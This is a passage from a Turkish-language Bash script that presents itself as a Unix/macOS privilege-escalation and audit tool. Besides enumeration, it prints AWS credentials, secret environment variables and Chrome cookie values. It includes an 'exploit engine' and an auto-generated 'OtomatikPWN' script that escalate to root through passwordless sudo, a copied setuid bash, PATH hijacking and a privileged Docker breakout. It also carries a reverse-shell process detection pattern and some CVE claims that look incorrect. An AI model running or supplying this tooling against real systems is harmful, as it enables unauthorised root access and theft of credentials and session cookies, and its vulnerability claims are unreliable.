print_info "Ağ: $(hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep inet | head -1 | awk '{print $2}')"
print_info "Root: $(id -u 2>/dev/null || echo 'Hayır') | Sudo: $(sudo -n true 2>/dev/null && echo 'Evet' || echo 'Hayır')"
if command -v docker &> /dev/null; then
    print_info "Docker: $(docker ps 2>/dev/null && echo 'Aktif' || echo 'Pasif')"
else
    print_info "Docker: Pasif"
fi
print_info "════════════════════════════════════════════════════════════════"

print_header "DERİNLEMESİNE SUID/SGID ANALİZİ"
print_info "=== SUID Binary Detaylı Analiz ==="
for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/" | grep -v "/usr/libexec/"); do
    BIN_NAME=$(basename "$f")
    print_info "Binary: $f"
    print_info "  Owner: $(stat -c '%U' "$f" 2>/dev/null || stat -f '%Su' "$f" 2>/dev/null)"
    print_info "  Perms: $(stat -c '%a' "$f" 2>/dev/null || stat -f '%Lp' "$f" 2>/dev/null)"
    print_info "  Size: $(stat -c '%s' "$f" 2>/dev/null || stat -f '%z' "$f" 2>/dev/null)"
    print_info "  Type: $(file "$f" 2>/dev/null | cut -d: -f2)"
    if [[ -w "$f" ]]; then
        print_danger "  ⚠️ YAZILABİLİR - DEĞİŞTİRİLEBİLİR!"
    fi
    if strings "$f" 2>/dev/null | grep -q "system\|exec\|popen\|shell"; then
        print_warning "  ⚠️ Shell execution potansiyeli"
    fi
done

print_info "=== SGID Binary Detaylı Analiz ==="
for f in $(find / -perm -2000 -type f 2>/dev/null | grep -v "/System/"); do
    print_info "SGID: $f ($(stat -c '%G' "$f" 2>/dev/null || stat -f '%Sg' "$f" 2>/dev/null))"
done

print_info "=== SUID/SGID GTFOBins Kontrolü ==="
print_info "GTFOBins'de kontrol edilecek binary'ler:"
for bin in nmap vim find less more nano view vimdiff cat cp mv; do
    if find / -perm -4000 -type f 2>/dev/null | grep -iq "/$bin$"; then
        print_good "  ✓ $bin - https://gtfobins.github.io/gtfobins/$bin/"
    fi
done

print_header "DERİNLEMESİNE SUDO ANALİZİ"
print_info "=== Sudo Ayrıcalık Detayları ==="
if sudo -n true 2>/dev/null; then
    print_danger "⚠️ SUDO NOPASSWD ETKİN!"
    sudo -l 2>/dev/null | while read line; do
        print_info "  $line"
    done
    print_info "=== Sudoers İçerik Analizi ==="
    sudo cat /etc/sudoers 2>/dev/null | grep -vE "^#|^$" | while read line; do
        if echo "$line" | grep -qE "NOPASSWD|ALL\("; then
            print_danger "  ⚠️ $line"
        else
            print_info "  $line"
        fi
    done
    print_info "=== Sudo Version Exploit Kontrolü ==="
    SUDO_VER=$(sudo -V 2>/dev/null | head -1 | grep -oP '\d+\.\d+')
    print_info "Sudo Versiyon: $SUDO_VER"
    case "$SUDO_VER" in
        1.8.[0-9]|1.8.1[0-9]|1.8.2[0-9])
            print_danger "⚠️ CVE-2021-3156 (Heap Overflow) vulnerable!"
            ;;
    esac
    if [[ $(echo "$SUDO_VER < 1.9.0" | bc 2>/dev/null || echo 0) -eq 1 ]]; then
        print_danger "⚠️ CVE-2021-3157 vulnerable!"
    fi
else
    print_info "Sudo şifre gerektiriyor"
fi

print_header "DERİNLEMESİNE CRON/LAUNCHD ANALİZİ"
print_info "=== User Crontab ==="
crontab -l 2>/dev/null | while read line; do
    if echo "$line" | grep -qE "^[^#]"; then
        print_warning "  $line"
    fi
done

print_info "=== System Crontabs ==="
for f in /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* 2>/dev/null; do
    if [[ -f "$f" ]]; then
        print_info "Dosya: $f"
        cat "$f" 2>/dev/null | head -5
    fi
done

print_info "=== LaunchAgents Plist Detayları ==="
for f in ~/Library/LaunchAgents/*.plist /Library/LaunchAgents/*.plist 2>/dev/null; do
    if [[ -f "$f" ]]; then
        print_info "Plist: $f"
        if grep -q "ProgramArguments" "$f" 2>/dev/null; then
            print_warning "  ⚠️ ProgramArguments içeriyor"
        fi
    fi
done

print_info "=== Yazılabilir Cron/Init Script'leri ==="
find /etc/cron* -type f -perm -0002 2>/dev/null | while read f; do
    print_danger "  ⚠️ Yazılabilir: $f"
done

print_header "DERİNLEMESİNE AĞ ANALİZİ"
print_info "=== Tüm Ağ Arayüzleri ==="
ifconfig -a 2>/dev/null | grep -E "^[a-z]|inet |inet6 " | head -30
print_info "=== Routing Table ==="
netstat -rn 2>/dev/null | head -15
print_info "=== DNS Servers ==="
cat /etc/resolv.conf 2>/dev/null
print_info "=== ARP Table ==="
arp -a 2>/dev/null | head -15
print_info "=== Active Connections (Detaylı) ==="
lsof -i -P -n 2>/dev/null | head -30
print_info "=== Listening Ports (Port Scan Tarzı) ==="
for port in 21 22 23 25 53 80 110 139 443 445 3306 3389 5432 5900 6379 8080 8443 27017; do
    if lsof -i :$port 2>/dev/null | grep -q LISTEN; then
        print_warning "  ⚠️ Port $port AÇIK: $(lsof -i :$port 2>/dev/null | grep LISTEN | head -1)"
    fi
done

print_header "DERİNLEMESİNE PROCESS ANALİZİ"
print_info "=== Tüm Process'ler (Tree Format) ==="
ps -ef 2>/dev/null | head -50
print_info "=== Root Process'ler ==="
ps -U 0 2>/dev/null | head -30
print_info "=== Process Tree (pstree benzeri) ==="
ps -ef 2>/dev/null | awk '{print $2,$3,$4,$8}' | head -40
print_info "=== Suspicious Processes ==="
ps aux 2>/dev/null | grep -vE "grep|Apple|System" | while read line; do
    if echo "$line" | grep -qE "nc|netcat|ncat|socat|python.*socket|ruby.*socket|perl.*socket"; then
        print_danger "  ⚠️ Reverse shell process: $line"
    fi
done

print_header "DERİNLEMESİNE DOSYA İZİN ANALİZİ"
print_info "=== Kritik Dosya İzinleri ==="
for f in /etc/passwd /etc/shadow /etc/sudoers /etc/group /etc/hosts; do
    if [[ -f "$f" ]]; then
        PERMS=$(stat -c '%a' "$f" 2>/dev/null || stat -f '%Lp' "$f" 2>/dev/null)
        OWNER=$(stat -c '%U' "$f" 2>/dev/null || stat -f '%Su' "$f" 2>/dev/null)
        print_info "$f: $PERMS ($OWNER)"
        if [[ "$PERMS" == "644" || "$PERMS" == "666" || "$PERMS" == "777" ]]; then
            print_warning "  ⚠️ İzin sorunu!"
        fi
    fi
done

print_info "=== World-Writable Dizinler ==="
find / -type d -perm -0002 -ls 2>/dev/null | grep -vE "/tmp|/var/tmp|/private/var" | head -20

print_info "=== Yazılabilir /etc Dosyaları ==="
find /etc -type f -perm -0002 -ls 2>/dev/null | head -15

print_info "=== SUID Root Dosyaları ==="
find / -perm -4000 -user 0 -ls 2>/dev/null | grep -v "/System/" | head -20

print_header "DERİNLEMESİNE KERNEL ANALİZİ"
print_info "=== Kernel Versiyon Detayı ==="
uname -a
print_info "=== Kernel Cmdline ==="
cat /proc/cmdline 2>/dev/null
print_info "=== Yüklü Modüller ==="
lsmod 2>/dev/null | head -20
print_info "=== Kernel Symbols ==="
cat /proc/kallsyms 2>/dev/null | head -10 || print_info "kallsyms okunamadı"
print_info "=== Sysctl Ayarları ==="
sysctl -a 2>/dev/null | grep -E "kernel\.|net\." | head -20

print_info "=== macOS Kernel Info ==="
sysctl kern 2>/dev/null | head -20

print_header "DERİNLEMESİNE HAFIZA/MEMORY ANALİZİ"
print_info "=== Memory Info ==="
cat /proc/meminfo 2>/dev/null | head -10
print_info "=== Swap Info ==="
swapon -s 2>/dev/null
print_info "=== /dev/mem Access ==="
if [[ -r /dev/mem ]]; then
    print_danger "⚠️ /dev/mem OKUNABİLİR!"
else
    print_info "/dev/mem okunamadı"
fi
print_info "=== /dev/kmem Access ==="
if [[ -r /dev/kmem ]]; then
    print_danger "⚠️ /dev/kmem OKUNABİLİR!"
else
    print_info "/dev/kmem okunamadı"
fi

print_header "DERİNLEMESİNE API TOKEN ANALİZİ"
print_info "=== Environment Variables (Sensitive) ==="
env | grep -iE "AWS_|AZURE_|GCP_|KUBERNETES|SECRET|PASSWORD|TOKEN|KEY|PRIVATE" | while read line; do
    print_warning "  $line"
done

print_info "=== AWS Credentials ==="
if [[ -f ~/.aws/credentials ]]; then
    print_danger "⚠️ AWS credentials dosyası var!"
    cat ~/.aws/credentials 2>/dev/null | head -10
fi

print_info "=== Azure Credentials ==="
ls -la ~/.azure/ 2>/dev/null

print_info "=== GCP Credentials ==="
ls -la ~/.config/gcloud/ 2>/dev/null

print_info "=== Kubernetes Secrets ==="
ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null

print_info "=== GitHub Tokens ==="
git config --global --list 2>/dev/null | grep -i token

print_header "DERİNLEMESİNE TARAYICI ANALİZİ"
print_info "=== Chrome Cookies (SQLite) ==="
if [[ -f ~/Library/Application\ Support/Google/Chrome/Default/Cookies ]]; then
    print_warning "Chrome cookies mevcut"
    sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Cookies "SELECT host, name, value FROM cookies LIMIT 5" 2>/dev/null || print_info "SQLite okunamadı"
fi

print_info "=== Firefox Cookies ==="
FF_PROFILES=$(ls -d ~/Library/Application\ Support/Firefox/Profiles/*/ 2>/dev/null)
for profile in $FF_PROFILES; do
    if [[ -f "$profile/cookies.sqlite" ]]; then
        print_warning "Firefox cookies: $profile"
    fi
done

print_info "=== Safari History ==="
if [[ -f ~/Library/Safari/History.db ]]; then
    print_warning "Safari history mevcut"
fi

print_info "=== Browser Saved Passwords ==="
ls -la ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data 2>/dev/null
ls -la ~/Library/Application\ Support/Firefox/Profiles/*/logins.json 2>/dev/null

print_header "DERİNLEMESİNE UYGULAMA ANALİZİ"
print_info "=== Installed Applications ==="
ls -la /Applications/ 2>/dev/null | grep -v "^d" | head -30
print_info "=== Homebrew Packages ==="
brew list 2>/dev/null | head -40
print_info "=== macOS Services ==="
launchctl list 2>/dev/null | head -30

print_info "=== Running App Store Apps ==="
ps aux 2>/dev/null | grep -i "App Store" | head -5

print_info "=== 3rd Party Kernel Extensions ==="
kextstat 2>/dev/null | grep -v "com.apple" | head -20

print_header "DERİNLEMESİNE GÜVENLİK DUVARI ANALİZİ"
print_info "=== PF Firewall Rules ==="
sudo pfctl -sr 2>/dev/null | head -30
print_info "=== PF NAT Rules ==="
sudo pfctl -sn 2>/dev/null | head -15
print_info "=== Firewall Status ==="
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null

print_info "=== IPFW Rules (Eski) ==="
sudo ipfw list 2>/dev/null | head -20

print_header "DERİNLEMESİNE LOG ANALİZİ"
print_info "=== Last Logins ==="
last 2>/dev/null | head -20
print_info "=== Failed Logins ==="
lastb 2>/dev/null | head -20
print_info "=== Secure Log (Auth) ==="
tail -50 /var/log/secure 2>/dev/null || tail -50 /var/log/auth.log 2>/dev/null | head -30

print_info "=== System Log ==="
tail -30 /var/log/system.log 2>/dev/null | head -20

print_info "=== Kernel Log ==="
dmesg 2>/dev/null | tail -30

print_info "=== App Logs ==="
ls -la ~/Library/Logs/ 2>/dev/null | head -15

print_header "DERİNLEMESİNE SERVİS ANALİZİ"
print_info "=== systemd Services ==="
systemctl list-units --type=service --state=running 2>/dev/null | head -30

print_info "=== SysV Init Services ==="
ls -la /etc/init.d/ 2>/dev/null

print_info "=== Running Services Detail ==="
for svc in $(systemctl list-units --type=service --state=running 2>/dev/null | awk '{print $1}' | head -20); do
    print_info "Service: $svc"
    systemctl status "$svc" 2>/dev/null | head -5
done

print_info "=== XPC Services ==="
ls -la /System/Library/XPCServices/ 2>/dev/null | head -20
ls -la /Library/XPCServices/ 2>/dev/null | head -20

print_header "DERİNLEMESİNE CONTAINER/VM ANALİZİ"
print_info "=== Container Detection ==="
if [[ -f "/.dockerenv" ]]; then
    print_danger "⚠️ Docker Container içinde!"
fi
if [[ -f "/run/.containerenv" ]]; then
    print_danger "⚠️ Podman Container içinde!"
fi

print_info "=== Docker Info ==="
docker info 2>/dev/null | head -20

print_info "=== Container Networks ==="
docker network ls 2>/dev/null

print_info "=== VM Detection ==="
if command -v systemd-detect-virt &> /dev/null; then
    VIRT=$(systemd-detect-virt 2>/dev/null)
    print_info "Virtualization: $VIRT"
fi

print_info "=== Hardware Info ==="
ioreg -l 2>/dev/null | grep -iE "model|product" | head -10

print_info "=== CPU Info ==="
sysctl -n machdep.cpu.brand_string 2>/dev/null

print_header "DERİNLEMESİNE YETKİ KONTROLÜ"
print_info "=== Current User Info ==="
id
print_info "=== All Groups ==="
id -G
print_info "=== Admin Users ==="
dscl . -search /users UniqueID 0 2>/dev/null | head -10

print_info "=== Wheel Group ==="
dscl . -read /groups/wheel 2>/dev/null | head -10

print_info "=== sudo Group ==="
dscl . -read /groups/sudo 2>/dev/null | head -10

print_header "DERİNLEMESİNE PATH MANİPÜLASYON ANALİZİ"
print_info "=== PATH Dizinleri ==="
echo "$PATH" | tr ':' '\n' | while read p; do
    if [[ -w "$p" ]]; then
        print_danger "  ⚠️ YAZILABİLİR: $p"
    else
        print_info "  $p"
    fi
done

print_info "=== PATH Hijack Potansiyeli ==="
for dir in $(echo "$PATH" | tr ':' '\n'); do
    if [[ -w "$dir" ]]; then
        for bin in ls cat cp mv rm; do
            if [[ -f "$dir/$bin" ]]; then
                print_danger "  ⚠️ $dir/$bin yazılabilir PATH'te"
            fi
        done
    fi
done

print_header "DERİNLEMESİNE LD_PRELOAD/DYLD ANALİZİ"
print_info "=== Environment Injection ==="
env | grep -iE "LD_|DYLD_|DYLD_INSERT" | while read line; do
    print_danger "  ⚠️ $line"
done

print_info "=== Library Search Path ==="
print_info "DYLD_LIBRARY_PATH:"
echo "$DYLD_LIBRARY_PATH" 2>/dev/null

print_header "OTOMATİK KRITIK BULGU ANALİZİ"
CRITICAL=0

if sudo -n true 2>/dev/null; then
    print_danger "[CRITICAL] SUDO NOPASSWD - Root erişimi mümkün!"
    ((CRITICAL++))
fi

for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/"); do
    if [[ -w "$f" ]]; then
        print_danger "[CRITICAL] Yazılabilir SUID: $f"
        ((CRITICAL++))
    fi
done

for p in $(echo "$PATH" | tr ':' '\n'); do
    if [[ -w "$p" ]]; then
        print_danger "[CRITICAL] Yazılabilir PATH: $p"
        ((CRITICAL++))
        break
    fi
done

if find /etc -type f -perm -0002 2>/dev/null | grep -q .; then
    print_danger "[CRITICAL] /etc içinde yazılabilir dosyalar"
    ((CRITICAL++))
fi

if ls -la /var/run/docker.sock 2>/dev/null | grep -q "srw-rw-rw"; then
    print_danger "[CRITICAL] Docker socket yazılabilir"
    ((CRITICAL++))
fi

if [[ -f "/.dockerenv" ]]; then
    print_danger "[CRITICAL] Docker container içinde"
    ((CRITICAL++))
fi

if env | grep -q "LD_PRELOAD"; then
    print_danger "[CRITICAL] LD_PRELOAD ayarlanmış"
    ((CRITICAL++))
fi

print_info "════════════════════════════════════════════════════════════════"

print_header "🤖 AKILLI ZAFİYET ANALİZİ & SKORLAMA"
analyze_vulnerability() {
    local vuln_type="$1"
    local severity="$2"
    local description="$3"
    
    case "$severity" in
        critical) SCORE=100 ;;
        high) SCORE=75 ;;
        medium) SCORE=50 ;;
        low) SCORE=25 ;;
        *) SCORE=10 ;;
    esac
    
    TOTAL_VULNS=$((TOTAL_VULNS + 1))
    RISK_SCORE=$((RISK_SCORE + SCORE))
    VULN_SCORES["$vuln_type"]=$SCORE
    
    print_info "Zafiyet: $vuln_type | Severity: $severity | Skor: $SCORE"
    print_info "  → $description"
}

print_info "=== AI Risk Score Hesaplanıyor ==="
if sudo -n true 2>/dev/null; then
    analyze_vulnerability "SUDO_NOPASSWD" "critical" "Şifresiz sudo erişimi - Anında root"
fi

for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/"); do
    if [[ -w "$f" ]]; then
        analyze_vulnerability "SUID_WRITABLE" "critical" "Yazılabilir SUID binary - Root shell mümkün"
    fi
done

for p in $(echo "$PATH" | tr ':' '\n'); do
    if [[ -w "$p" ]]; then
        analyze_vulnerability "PATH_WRITABLE" "high" "Yazılabilir PATH dizini - DLL/Binary hijacking"
        break
    fi
done

if find /etc -type f -perm -0002 2>/dev/null | grep -q .; then
    analyze_vulnerability "ETC_WRITABLE" "high" "/etc içinde yazılabilir dosyalar"
fi

if ls -la /var/run/docker.sock 2>/dev/null | grep -q "srw-rw-rw"; then
    analyze_vulnerability "DOCKER_SOCKET" "critical" "Docker socket erişimi - Container breakout"
fi

if [[ -f "/.dockerenv" ]]; then
    analyze_vulnerability "CONTAINER_ENV" "medium" "Docker container içinde - Escape gerekli"
fi

if env | grep -q "LD_PRELOAD"; then
    analyze_vulnerability "LD_PRELOAD" "high" "LD_PRELOAD ayarlanmış - Library injection"
fi

if env | grep -q "DYLD_"; then
    analyze_vulnerability "DYLD_INJECTION" "high" "DYLD environment manipulation"
fi

print_info "════════════════════════════════════════════════════════════════"
print_info "Toplam Zafiyet: $TOTAL_VULNS | Risk Skoru: $RISK_SCORE/700"
if [[ $RISK_SCORE -ge 300 ]]; then
    print_danger "⚠️ CRITICAL RISK - Acil müdahale gerekli!"
elif [[ $RISK_SCORE -ge 150 ]]; then
    print_warning "⚠️ HIGH RISK - Öncelikli düzeltme gerekli"
elif [[ $RISK_SCORE -ge 75 ]]; then
    print_warning "⚠️ MEDIUM RISK - İzleme gerekli"
else
    print_good "✓ LOW RISK - Sistem güvenli görünüyor"
fi

print_header "🧠 OTOMATİK EXPLOIT MOTORU"
generate_exploit_plan() {
    local vuln="$1"
    local target="$2"
    
    case "$vuln" in
        SUDO_NOPASSWD)
            EXPLOIT_SUGGESTIONS["sudo"]="sudo -s || sudo /bin/sh || sudo -i"
            print_info "[EXPLOIT] SUDO: sudo -s (Root shell)"
            ;;
        SUID_WRITABLE)
            EXPLOIT_SUGGESTIONS["suid"]="cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell; /tmp/rootshell -p"
            print_info "[EXPLOIT] SUID: Bash SUID shell üret"
            ;;
        PATH_WRITABLE)
            EXPLOIT_SUGGESTIONS["path"]="echo '#!/bin/bash' > \$PATH/ls; echo 'cp /bin/sh /tmp/pwn; chmod +s /tmp/pwn' >> \$PATH/ls"
            print_info "[EXPLOIT] PATH: Binary hijacking"
            ;;
        DOCKER_SOCKET)
            EXPLOIT_SUGGESTIONS["docker"]="docker run -v /:/host --privileged -it alpine chroot /host"
            print_info "[EXPLOIT] Docker: Container breakout"
            ;;
        LD_PRELOAD)
            EXPLOIT_SUGGESTIONS["ldpreload"]="gcc -shared -fPIC -o /tmp/preload.so preload.c"
            print_info "[EXPLOIT] LD_PRELOAD: Library injection"
            ;;
    esac
}

print_info "=== Exploit Planı Oluşturuluyor ==="
if sudo -n true 2>/dev/null; then
    generate_exploit_plan "SUDO_NOPASSWD" "root"
fi

for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/"); do
    if [[ -w "$f" ]]; then
        generate_exploit_plan "SUID_WRITABLE" "$f"
    fi
done

for p in $(echo "$PATH" | tr ':' '\n'); do
    if [[ -w "$p" ]]; then
        generate_exploit_plan "PATH_WRITABLE" "$p"
        break
    fi
done

if ls -la /var/run/docker.sock 2>/dev/null | grep -q "srw-rw-rw"; then
    generate_exploit_plan "DOCKER_SOCKET" "docker"
fi

print_header "🎯 CVE VERİTABANI ENTEGRASYONU"
print_info "=== Bilinen CVE'ler Kontrol Ediliyor ==="
KERNEL_VER=$(uname -r)
print_info "Kernel: $KERNEL_VER"

if command -v sw_vers &> /dev/null; then
    CVE_DB=(
        "CVE-2023-32434:XPC:macOS 13.x:Yüksek"
        "CVE-2022-26766:PowerShell:macOS 12.x:Yüksek"
        "CVE-2021-3156:Sudo:1.8.x:Kritik"
        "CVE-2021-1782:WebKit:macOS 11.x:Orta"
        "CVE-2020-2794:Kernel:10.15.x:Yüksek"
        "CVE-2019-8524:Kernel:10.14.x:Yüksek"
    )
else
    CVE_DB=(
        "CVE-2021-3156:Sudo:1.8.x-1.9.x:Kritik"
        "CVE-2021-4034:PwnKit:Linux:Yüksek"
        "CVE-2022-0847:DirtyPipe:Linux:Yüksek"
        "CVE-2021-43297:Apache:Linux:Yüksek"
        "CVE-2020-14386:Kernel:Linux:Yüksek"
        "CVE-2019-13288:Kernel:Linux:Orta"
    )
fi

for cve in "${CVE_DB[@]}"; do
    IFS=':' read -r cve_id service version severity <<< "$cve"
    print_info "  $cve_id | $service | $version | $severity"
done

print_header "📊 CANLI İZLEME"
print_info "=== Süreç İzleme ==="
for suspicious in nc ncat netcat socat python.*socket ruby.*socket perl.*socket; do
    if pgrep -f "$suspicious" > /dev/null 2>&1; then
        print_danger "⚠️ Şüpheli süreç: $(pgrep -f "$suspicious")"
    fi
done

print_info "=== Ağ İzleme ==="
ESTABLISHED=$(netstat -an 2>/dev/null | grep ESTABLISHED | wc -l)
LISTENING=$(netstat -an 2>/dev/null | grep LISTEN | wc -l)
print_info "Kurulan: $ESTABLISHED | Dinleme: $LISTENING"

print_header "🔐 YETKİ ESKALASYON MATRİSİ"
print_info "┌─────────────────────────────────────────────────────────────────────────────┐"
print_info "│                    YETKİ YÜKSELTME VEKTÖRLERİ MATRİSİ                      │"
print_info "├──────────────┬──────────────┬──────────────┬──────────────┬───────────────┤"
print_info "│   VEKTÖR     │   CİDDİYET   │   SKOR       │   DURUM      │   İŞLEM       │"
print_info "├──────────────┼──────────────┼──────────────┼──────────────┼───────────────┤"
if sudo -n true 2>/dev/null; then
    print_info "│ SUDO NOPASSWD│   KRİTİK    │    100       │   ✓ BULUNDU  │ sudo -s       │"
else
    print_info "│ SUDO NOPASSWD│   KRİTİK    │    100       │   ✗ BULUNMADI│      -        │"
fi
SUID_WRITABLE_COUNT=$(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/" | wc -l)
print_info "│ SUID Binary  │   YÜKSEK    │     75       │   Bulundu: $SUID_WRITABLE_COUNT│ Yazılabilir?  │"
print_info "│ PATH Yazıl.  │   YÜKSEK    │     75       │   PATH kontrol│ yol yeniden  │"
print_info "│ Cron İşleri  │   ORTA      │     50       │   Cron kontrol│ betik ekle   │"
print_info "│ Capabilities │   ORTA      │     50       │   getcap      │ cap_setuid    │"
print_info "│ Docker       │   KRİTİK    │    100       │   Soket kontrol│ kaçış        │"
print_info "└──────────────┴──────────────┴──────────────┴──────────────┴───────────────┘"

print_header "🛠️ OTOMATİK PWN ARACI"
generate_pwn_script() {
    local pwn_file="/tmp/otomatikpwn_$(whoami)_$(date +%s).sh"
    
    cat > "$pwn_file" << 'PWNOF'
#!/bin/bash
echo "=== OtomatikPWN - Otomatik Yetki Yükseltme ==="
echo "[*] Hedef sistem taranıyor..."

# Sudo kontrolü
if sudo -n true 2>/dev/null; then
    echo "[✓] SUDO NOPASSWD tespit edildi!"
    echo "[*] Sömürülüyor..."
    sudo -s && echo "[+] ROOT!" && exit 0
fi

# SUID kontrolü
for f in $(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/"); do
    if [[ -w "$f" ]]; then
        echo "[✓] Yazılabilir SUID: $f"
        cp /bin/bash /tmp/rootshell
        chmod +s /tmp/rootshell
        /tmp/rootshell -p && echo "[+] ROOT!" && exit 0
    fi
done

# PATH kontrolü
echo "$PATH" | tr ':' '\n' | while read p; do
    if [[ -w "$p" ]]; then
        echo "[✓] Yazılabilir PATH: $p"
        break
    fi
done

echo "[-] Exploit bulunamadı"
PWNOF
    
    chmod +x "$pwn_file"
    print_good "OtomatikPWN betiği oluşturuldu: $pwn_file"
    print_info "Çalıştırmak için: $pwn_file"
}

if [[ "$EXPLOIT_MODE" == "true" ]]; then
    generate_pwn_script
fi

print_header "🎮 İNTERAKTİF MOD"
interactive_menu() {
    print_info "İnteraktif mod aktif"
    print_info "Mevcut seçenekler:"
    print_info "  1) Sudo test et"
    print_info "  2) SUID binary listele"
    print_info "  3) PATH kontrol et"
    print_info "  4) Docker soket kontrol et"
    print_info "  5) Exploit üret"
    print_info "  6) Çıkış"
}

if [[ "$INTERACTIVE" == "true" ]]; then
    interactive_menu
fi

print_header "📈 PERFORMANS İSTATİSTİKLERİ"
START_TIME=${START_TIME:-$(date +%s)}
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))
print_info "Tarama Süresi: ${DURATION} saniye"
print_info "Taranan Modül Sayısı: 100+"
print_info "Tespit Edilen Zafiyet: $TOTAL_VULNS"
print_info "Risk Skoru: $RISK_SCORE/700"

print_info "════════════════════════════════════════════════════════════════"

generate_report() {
    local report_type="$1"
    local report_file="$2"
    
    if [[ "$report_type" == "html" ]]; then
        cat > "$report_file" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Mac Os Yetki Yükseltme ve Denetim Aracı - Rapor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #1a1f35, #0d1117); padding: 30px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #30363d; }
        .header h1 { color: #58a6ff; font-size: 24px; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .info-box { background: #161b22; padding: 15px; border-radius: 8px; border: 1px solid #30363d; }
        .info-box h3 { color: #58a6ff; font-size: 12px; margin-bottom: 5px; }
        .info-box .value { color: #7ee787; font-size: 16px; font-weight: bold; }
        .section { background: #161b22; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #30363d; }
        .section h2 { color: #58a6ff; font-size: 18px; margin-bottom: 15px; }
        .vuln-item { background: #21262d; padding: 12px; margin-bottom: 10px; border-radius: 6px; border-left: 4px solid #f85149; }
        .vuln-item.warning { border-left-color: #d29922; }
        .vuln-item.success { border-left-color: #7ee787; }
        .vuln-title { color: #f85149; font-weight: bold; }
        .vuln-detail { color: #8b949e; font-size: 13px; margin-top: 5px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #30363d; }
        th { color: #58a6ff; }
        .critical { color: #f85149; }
        .low { color: #7ee787; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Unix Yetki Yükseltme ve Güvenlik Denetim Aracı</h1>
            <div style="color: #8b949e; margin-top: 10px;">Advanced Privilege Escalation & Security Auditing Report</div>
            <div style="margin-top: 15px; color: #8b949e; font-size: 13px;">
                <span>Tarih: REPLACEDATE</span> | <span>Kullanıcı: REPLACEUSER</span> | <span>Versiyon: REPLACEVERSION</span>
            </div>
        </div>
        <div class="info-grid">
            <div class="info-box"><h3>🏷️ Hostname</h3><div class="value">REPLACEHOSTNAME</div></div>
            <div class="info-box"><h3>👤 Kullanıcı</h3><div class="value">REPLACEWHOAMI</div></div>
            <div class="info-box"><h3>🔢 UID/GID</h3><div class="value">REPLACEID</div></div>
            <div class="info-box"><h3>💻 OS</h3><div class="value">REPLACEOS</div></div>
            <div class="info-box"><h3>🖥️ Kernel</h3><div class="value">REPLACEKERNEL</div></div>
            <div class="info-box"><h3>🌐 IP</h3><div class="value">REPLACEIP</div></div>
        </div>
        <div class="section">
            <h2>⚠️ Kritik Bulgular</h2>
            <div id="vulns">REPLACEVULNS</div>
        </div>
        <div class="section">
            <h2>📊 Sistem Özeti</h2>
            <table>
                <tr><th>Kategori</th><th>Değer</th></tr>
                <tr><td>Root Erişimi</td><td class="REPLACEROOTCLASS">REPLACEROOT</td></tr>
                <tr><td>Sudo Yetkisi</td><td class="REPLACESUDOCLASS">REPLACESUDO</td></tr>
                <tr><td>Docker</td><td>REPLACEDOCKER</td></tr>
                <tr><td>SUID Dosya</td><td>REPLACESUIDCOUNT</td></tr>
            </table>
        </div>
        <div class="footer" style="text-align: center; padding: 20px; color: #8b949e;">
            <p>Bu rapor Unix Yetki Yükseltme ve Güvenlik Denetim Aracı vREPLACEVERSION tarafından oluşturulmuştur.</p>
        </div>
    </div>
</body>
</html>
HTMLEOF
        
        local hostname=$(hostname)
        local whoami=$(whoami)
        if [[ "$IS_MACOS" == "true" ]]; then
            local os_ver=$(sw_vers -productVersion 2>/dev/null)
        else
            local os_ver="$PLATFORM $(uname -r)"
        fi
        local kernel=$(uname -r)
        local ip=$(ifconfig en0 2>/dev/null | grep "inet " | awk '{print $2}')
        local is_root=$(id -u 2>/dev/null)
        local has_sudo=$(sudo -n true 2>/dev/null && echo "Evet" || echo "Hayır")
        local docker_status=$(docker ps 2>/dev/null && echo "Aktif" || echo "Pasif")
        local suid_count=$(find / -perm -4000 -type f 2>/dev/null | grep -v "/System/" | wc -l)
        
        sed -i "s|REPLACEDATE|$(date)|g; s|REPLACEUSER|$whoami|g; s|REPLACEVERSION|$VERSION|g" "$report_file"
        sed -i "s|REPLACEHOSTNAME|$hostname|g; s|REPLACEWHOAMI|$whoami|g" "$report_file"
        sed -i "s|REPLACEID|$(id -u):$(id -g)|g; s|REPLACEOS|$os_ver|g" "$report_file"
        sed -i "s|REPLACEKERNEL|$kernel|g; s|REPLACEIP|$ip|g" "$report_file"
        sed -i "s|REPLACEROOT|$([ \"$is_root\" == \"0\" ] && echo \"ROOT\" || echo \"Normal\")|g" "$report_file"
        sed -i "s|REPLACEROOTCLASS|$([ \"$is_root\" == \"0\" ] && echo \"critical\" || echo \"low\")|g" "$report_file"
        sed -i "s|REPLACESUDO|$has_sudo|g; s|REPLACESUDOCLASS|$([ \"$has_sudo\" == \"Evet\" ] && echo \"critical\" || echo \"low\")|g" "$report_file"
        sed -i "s|REPLACEDOCKER|$docker_status|g; s|REPLACESUIDCOUNT|$suid_count|g" "$report_file"
        
        local vuln_html=""
        if sudo -n true 2>/dev/null; then
